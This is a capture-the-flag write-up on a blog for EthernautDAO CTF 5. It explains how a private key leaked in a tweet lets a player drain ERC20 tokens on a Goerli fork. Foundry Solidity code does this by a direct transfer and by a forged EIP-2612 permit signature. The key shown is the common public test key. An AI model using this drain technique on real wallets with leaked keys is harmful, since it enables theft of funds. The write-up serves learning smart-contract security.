---
title: 'EthernautDAO CTF — EthernautDAOToken Solution'
excerpt: ΞthernautDAO is common goods DAO aimed at transforming developers into Ethereum developers. </br></br>Our goal is to be able to drain a wallet balance.
coverImage:
  url: '/assets/blog/ethernautdao.jpeg'
  credit:
    name: ΞthernautDAO
    url: https://twitter.com/EthernautDAO
date: '2022-08-03T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethernautdao.jpeg'
---

[ΞthernautDAO](https://twitter.com/EthernautDAO) is common goods DAO aimed at transforming developers into Ethereum developers.

They started releasing CTF challenges on Twitter, so how couldn't I start solving them?

## CTF 5: EthernautDAO Token

The challenge start from this Tweet: https://twitter.com/EthernautDAO/status/1553742280967835648

For this challenge, we have to deal only with a single Smart Contract called [EthernautDaoToken](https://goerli.etherscan.io/address/0xf3cfa05f1ed0f5eb7a8080f1109ad7e424902121), an ERC20 contract that also support the ERC20 Permit extension allowing approvals to be made via signatures, as defined in [EIP-2612](https://eips.ethereum.org/EIPS/eip-2612).

After deploying the contract, the Deployer has executed three transactions:

- [Mint 1](https://goerli.etherscan.io/tx/0x1331ee0bf35371f47e4ce58369cd04661b9d7d94d413794c444098fc18979ede): minting `0.000000000000000001` tokens to the address `0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266`
- [Mint 2](https://goerli.etherscan.io/tx/0x068017eecef1c4c123898983476bff3f9917718ba9073f152193217d370b730e): minting `0.099999999999999999` tokens to the address `0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266`
- [Mint 3](https://goerli.etherscan.io/tx/0x4adf3d5b7f7a93d4567aef41aae8170eb592ccbae12a38c907c75aee3eb964ed): minting `0.999999999999999999` tokens to the address `0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266`

**Note:** EthernautDAOToken has 18 decimals

Inside the [Tweet](https://twitter.com/EthernautDAO/status/1553742280967835648), we see that [@EthernautDAO](https://twitter.com/EthernautDAO) also shared this information:

> private key of the wallet: 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
>
> Lets see if you can take that EDT token out

## Study the contracts

Let's start reviewing the contract code, and then we will discuss the **critical** information that has been shared inside the tweet.

```solidity
contract EthernautDaoToken is ERC20, ERC20Burnable, Pausable, AccessControl, ERC20Permit {
    bytes32 public constant PAUSER_ROLE = keccak256("PAUSER_ROLE");
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    constructor() ERC20("ETHERNAUTDAO TOKEN", "EDT") ERC20Permit("ETHERNAUTDAO TOKEN") {
        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _setupRole(PAUSER_ROLE, msg.sender);
        _mint(msg.sender, 1 * 10**decimals());
        _setupRole(MINTER_ROLE, msg.sender);
    }

    function pause() public {
        require(hasRole(PAUSER_ROLE, msg.sender));
        _pause();
    }

    function unpause() public {
        require(hasRole(PAUSER_ROLE, msg.sender));
        _unpause();
    }

    function mint(address to, uint256 amount) public {
        require(hasRole(MINTER_ROLE, msg.sender));
        _mint(to, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override whenNotPaused {
        super._beforeTokenTransfer(from, to, amount);
    }
}
```

The contract it's a pretty standard [ERC20](https://docs.openzeppelin.com/contracts/4.x/erc20) token that inherit from three different ERC20 OpenZeppelin implementation contracts:

- [ERC20Burnable](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Burnable): implements the `burn` and `burnFrom` function
- [Pausable](https://docs.openzeppelin.com/contracts/4.x/api/security#Pausable): implements the logic to allow `pause` and `unpause` features
- [ERC20Permit](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Permit): implementation of the ERC20 Permit extension allowing approvals to be made via signatures, as defined in [EIP-2612](https://eips.ethereum.org/EIPS/eip-2612)

The `constructor` of the contract initialize the `ERC20` and `ERC20Permit` inherited contracts, set up the `admin`, `minter` and `pauser` role and mint `1` token to the `msg.sender` (deployer)

Then you some functions like

- `pause` to pause each token transfer (see `_beforeTokenTransfer`)
- `unpause` to unpause the contract
- `mint` to mint tokens
- `_beforeTokenTransfer` implements the `ERC20` hook that is called when `mint`, `burn`, `transfer` and `transferFrom` are called. This implementation of the hook will revert if the contract is in a **paused** state

The solution does not come by exploiting the contract itself, but by exploiting the **leaked** information contained in the tweet.

**We have access to a private key of a user.** This mean that we can sign the transaction as if we were the user and drain his/her funds from the wallet.

To get the wallet associated to the private key, you can simply use Foundry cheatcode [vm.addr](https://book.getfoundry.sh/cheatcodes/addr) that takes a private key as parameter and return the address associated to it.

By executing `address walletAddress = vm.addr(WALLET_PRIVATE_KEY);` we now know that the address associated to it is **`0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266`**.

Does this address ring some bell? It's the same one that received the EthernautDAOToken minted by the first three transactions done by the contract's deployer!

By having access to the private key of the address, we can follow two solutions to drain the user's balance:

- call `transfer` on the token contract by signing the transaction with the private key
- have some fun and use the `permit` function that the contract is implementing and transfer those tokens from our own address (as a player)

Let's see those two solutions:

```solidity
/// @notice Solution 1: access directly as the final user
function solutionOne(
    address walletAddress,
    address player,
    uint256 walletBalance
) private {
    vm.startPrank(walletAddress);
    // simply transfer the tokens
    ethernautDaoToken.transfer(player, walletBalance);
    vm.stopPrank();
}

/// @notice Solution 2: access directly as the final user
function solutionTwo(
    address walletAddress,
    address player,
    uint256 walletBalance
) private {
    // Set a deadline in the future otherwise the `permit` call will revert
    uint256 deadline = block.timestamp + 1;

    // Reconstruct the EAO signed message to be used by the `permit` function when called by the player account
    bytes32 permitTypeHash = keccak256(
        "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
    );

    bytes32 erc20PermitStructHash = keccak256(
        abi.encode(permitTypeHash, walletAddress, player, walletBalance, 0, deadline)
    );
    bytes32 erc20PermitHash = ECDSA.toTypedDataHash(ethernautDaoToken.DOMAIN_SEPARATOR(), erc20PermitStructHash);
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(WALLET_PRIVATE_KEY, erc20PermitHash);

    // call the `permit` function not as the owner of the funds but as the player
    ethernautDaoToken.permit(walletAddress, player, walletBalance, deadline, v, r, s);

    vm.startPrank(player);
    // transfer tokens from the the real owner to the player account
    ethernautDaoToken.transferFrom(walletAddress, player, walletBalance);
    vm.stopPrank();
}
```

## Solution code

Now what we have to do is:

- Create an Alchemy or Infura account to be able to fork the Goerli blockchain
- Choose a good block from which we can create a fork. Any block after the creation of the contract will be good
- Run a foundry test that will use the fork to execute the test

Here's the code that I used for the test:

```solidity
function testTransferEDTToken() public {
    address player = users[0];

    address walletAddress = vm.addr(WALLET_PRIVATE_KEY);
    console.log(walletAddress);
    uint256 walletBalanceBefore = ethernautDaoToken.balanceOf(walletAddress);

    // Solution 1: access directly as the final user
    solutionOne(walletAddress, player, walletBalanceBefore / 2);

    // Solution 2: Use the Permit functions to allow the player to transfer the tokens on behalf of the user
    solutionTwo(walletAddress, player, ethernautDaoToken.balanceOf(walletAddress));

    // Assert that the player now owns all the balanced owned by the wallet before the exploit
    // And that the wallet has 0 tokens in its balance
    assertEq(ethernautDaoToken.balanceOf(player), walletBalanceBefore);
    assertEq(ethernautDaoToken.balanceOf(walletAddress), 0);
}
```

Here is the command I have used to run the test: `forge test --match-contract EthernautDaoTokenTest --fork-url <your_rpc_url> --fork-block-number 7318911 -vv`

Just remember to replace `<your_rpc_url>` with the RPC URL you got from Alchemy or Infura.

You can read the full solution of the challenge, opening [EthernautDaoToken.t.sol](https://github.com/StErMi/ethernautdao-ctf/blob/main/test/EthernautDaoToken.t.sol)

## Further reading

- [EIP-20: Token Standard](https://eips.ethereum.org/EIPS/eip-20)
- [EIP-2612: permit – 712-signed approvals](https://eips.ethereum.org/EIPS/eip-2612)
- [OpenZeppelin ERC20](https://docs.openzeppelin.com/contracts/4.x/erc20)
- [OpenZeppelin ERC20Burnable](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Burnable)
- [OpenZeppelin Pausable](https://docs.openzeppelin.com/contracts/4.x/api/security#Pausable)
- [OpenZeppelin ERC20Permit](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Permit)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
